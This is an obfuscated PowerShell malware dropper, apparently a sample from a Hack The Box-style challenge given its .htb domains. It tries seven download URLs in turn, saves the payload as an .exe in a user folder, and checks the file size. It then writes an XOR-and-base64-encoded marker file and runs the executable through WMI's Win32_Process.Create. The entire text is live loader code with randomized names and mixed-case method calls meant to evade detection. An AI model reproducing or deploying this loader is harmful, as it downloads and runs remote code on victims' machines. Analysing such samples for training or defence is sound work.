$FN5ggmsH = 182,187,229,146,231,177,151,149,166,186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139,183,154,173,128,175,151,238,140,183,162,228,170,173,179,229;

# 182 187 229 146 231 177 151 149 166 186 141 228 182 177 171 229 236 239 239 239 228 181 182 171 229 234 239 239 228185 179 190 184 229 151 139 157 164 235 177 239 171 183 236 141 128 187 235 134 128 158 177 176 139 183 154 173 128 175 151 238 140 183 162 228 170 173 179 229 223 228

$Scusbkj = "C:\Users\User\Jrbevk4\Ccwr_2h\Ale7g_8.exe";

$hbmskV2T = "C:\Users\User\Jrbevk4\Ccwr_2h\.conf";

$Odb3hf3=&('new-object') Net.WEBclIENt;

$Anbyt1y = "
http://da-industrial.htb/js/9IdLP/
http://daprofesional.htb/data4/hWgWjTV/
https://dagranitegiare.htb/wp-admin/tV/
http://www.outspokenvisions.htb/wp-includes/aWoM/
http://mobsouk.htb/wp-includes/UY30R/
http://biglaughs.htb/smallpotatoes/Y/
https://ngllogistics.htb/adminer/W3mkB/
"

foreach ($A8i3ke1 in $Anbyt1y)
{
	try
	{
		$Odb3hf3."dOWnLOAdfILe"($A8i3ke1, $Scusbkj);

		If ((&('Get-Item') $Scusbkj)."LEnGTh" -ge 45199) 
		{
			${A8i3ke1}.('ToCharArray').Invoke() | .('ForEach-Object') -process { ${FN5ggmsH} += ([byte][char]${_} -bxor 0xdf ) };
 			
            $FN5ggmsH += (228);
 			
            $b0Rje =  [type]('ConVerT');

   			$b0Rje::"tOBaSE64STRINg"(${FN5ggmsH}) | .('out-file') ${hbmskV2T};
 			
            ([wmiclass](('win32_Process'))."cReaTE"($Scusbkj);
			
            break;
		}

	}

	catch
	{

	}
}
